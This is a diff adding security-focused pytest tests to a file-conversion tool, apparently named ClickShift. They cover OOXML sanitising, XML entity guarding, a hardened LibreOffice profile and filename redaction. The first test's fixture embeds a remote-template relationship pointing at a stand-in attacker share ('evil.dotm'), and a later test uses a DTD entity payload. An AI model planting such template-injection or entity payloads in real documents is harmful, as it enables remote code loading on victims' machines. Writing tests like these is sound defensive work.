@@ -508,6 +508,150 @@ def test_selected_images_combine_in_order(tmp_path, monkeypatch):
     assert abs(pics[2].width - pics[2].height) < 10_000
 
 
+def test_ooxml_rels_sanitizer_strips_remote_template_and_preserves_hyperlink(tmp_path):
+    import zipfile
+    from clickshift.engine import _sanitize_ooxml_for_com
+
+    src = tmp_path / "doc.docx"
+    clean_dir = tmp_path / "sanitized"
+    clean_dir.mkdir()
+    rels = (
+        b'<?xml version="1.0" encoding="UTF-8" standalone="yes"?>'
+        b'<Relationships xmlns="http://schemas.openxmlformats.org/package/2006/relationships">'
+        b'<Relationship Id="rId1" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/attachedTemplate" '
+        b'Target="\\\\attacker.example\\share\\evil.dotm" TargetMode="External"/>'
+        b'<Relationship Id="rId2" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" '
+        b'Target="https://example.com" TargetMode="External"/>'
+        b'</Relationships>'
+    )
+    with zipfile.ZipFile(src, "w") as z:
+        z.writestr("[Content_Types].xml", b"<Types/>")
+        z.writestr("word/_rels/settings.xml.rels", rels)
+
+    safe = _sanitize_ooxml_for_com(src, clean_dir)
+    assert safe != src
+    with zipfile.ZipFile(safe, "r") as z:
+        out_rels = z.read("word/_rels/settings.xml.rels").decode("utf-8")
+    assert "attacker.example" not in out_rels
+    assert "https://example.com" in out_rels
+
+
+def test_epub_to_docx_without_temp_leak_and_entity_guard(tmp_path, engine):
+    import docx
+    import zipfile
+    from clickshift.engine import _safe_xml_fromstring
+
+    with pytest.raises(ValueError, match="DTD/ENTITY"):
+        _safe_xml_fromstring(b'<!DOCTYPE x [<!ENTITY lol "x">]><x>&lol;</x>')
+
+    epub = tmp_path / "book.epub"
+    with zipfile.ZipFile(epub, "w") as z:
+        z.writestr(
+            "META-INF/container.xml",
+            b'<?xml version="1.0"?><container version="1.0" '
+            b'xmlns="urn:oasis:names:tc:opendocument:xmlns:container">'
+            b'<rootfiles><rootfile full-path="OEBPS/content.opf" '
+            b'media-type="application/oebps-package+xml"/></rootfiles></container>',
+        )
+        z.writestr(
+            "OEBPS/content.opf",
+            b'<?xml version="1.0"?><package xmlns="http://www.idpf.org/2007/opf" version="2.0">'
+            b'<manifest><item id="c1" href="ch1.xhtml" media-type="application/xhtml+xml"/></manifest>'
+            b'<spine><itemref idref="c1"/></spine></package>',
+        )
+        z.writestr("OEBPS/ch1.xhtml", b"<html><body><p>Chapter One Safe Text</p></body></html>")
+
+    out_docx = tmp_path / "book.docx"
+    from clickshift.engine import conv_epub_extract
+    conv_epub_extract(epub, out_docx)
+    d = docx.Document(str(out_docx))
+    assert "Chapter One Safe Text" in "\n".join(p.text for p in d.paragraphs)
+
+
+def test_lo_convert_uses_hardened_temp_profile_and_cleans_up(tmp_path, monkeypatch):
+    from clickshift import engine as eng_mod
+
+    monkeypatch.setattr(eng_mod.BACKENDS, "libreoffice", "soffice")
+    src = tmp_path / "in.txt"
+    dst = tmp_path / "out.pdf"
+    src.write_text("hi", encoding="utf-8")
+    seen = {}
+
+    class _Proc:
+        returncode = 0
+        stderr = b""
+
+    def fake_run(args, **_kw):
+        env_arg = [a for a in args if str(a).startswith("-env:UserInstallation=")][0]
+        prof_uri = env_arg.split("=", 1)[1]
+        from urllib.parse import unquote, urlparse
+        raw_path = unquote(urlparse(prof_uri).path)
+        if os.name == "nt" and raw_path.startswith("/"):
+            raw_path = raw_path[1:]
+        pdir = Path(raw_path)
+        xcu = pdir / "user" / "registrymodifications.xcu"
+        seen["pdir"] = pdir
+        seen["xcu"] = xcu.read_text(encoding="utf-8")
+        dst.write_bytes(b"%PDF-1.4\n%%EOF\n")
+        return _Proc()
+
+    monkeypatch.setattr(eng_mod.subprocess, "run", fake_run)
+    eng_mod.lo_convert(src, dst)
+    assert "BlockUntrustedRefererLinks" in seen["xcu"]
+    assert not seen["pdir"].exists()
+
+
+def test_cli_filelist_preserves_order_and_cleans_up(tmp_path, monkeypatch):
+    import fitz
+    from PIL import Image
+    from clickshift import cli
+
+    imgs = []
+    for name, sz in [("first.png", (200, 80)), ("second.png", (80, 200))]:
+        p = tmp_path / name
+        Image.new("RGB", sz, (10, 50, 200)).save(p)
+        imgs.append(p)
+
+    stage = tmp_path / "ClickShift" / "staging"
+    stage.mkdir(parents=True)
+    fl = stage / "batch_1.filelist"
+    fl.write_text("\n".join(str(p) for p in imgs) + "\n", encoding="utf-8")
+
+    monkeypatch.setenv("CLICKSHIFT_NO_IPC", "1")
+    monkeypatch.setenv("CLICKSHIFT_DISABLE_ML", "1")
+    rc = cli.main(["convert", "--filelist", str(fl), "-t", "pdf"])
+    assert rc == 0
+    assert not fl.exists()
+    out_pdf = tmp_path / "first.pdf"
+    doc = fitz.open(str(out_pdf))
+    try:
+        assert len(doc) == 2
+        assert doc[0].rect.width > doc[0].rect.height
+        assert doc[1].rect.height > doc[1].rect.width
+    finally:
+        doc.close()
+
+
+def test_history_hashes_filenames_and_debuglog_redacts_home(tmp_path):
+    import json
+    from clickshift.learning import BanditSelector
+    from clickshift.debuglog import render_report
+
+    sel = BanditSelector(history_file=tmp_path / "history.jsonl")
+    secret = tmp_path / "Confidential_Client_Contract.pdf"
+    secret.write_bytes(b"%PDF-1.4\n")
+    sel.record(secret, ".docx", "pdf2docx", 120.0, True)
+    rec = json.loads((tmp_path / "history.jsonl").read_text(encoding="utf-8").splitlines()[-1])
+    assert "Confidential" not in rec["file"]
+    assert rec["file"].endswith(".pdf")
+
+    home_sample = Path.home() / "Documents" / "secret.pdf"
+    rep = render_report({"src": str(home_sample), "data_dir": str(Path.home() / ".clickshift")})
+    assert str(Path.home()) not in rep
+    assert "~/Documents" in rep or "~\\Documents" in rep
+
+
+
 
 
 
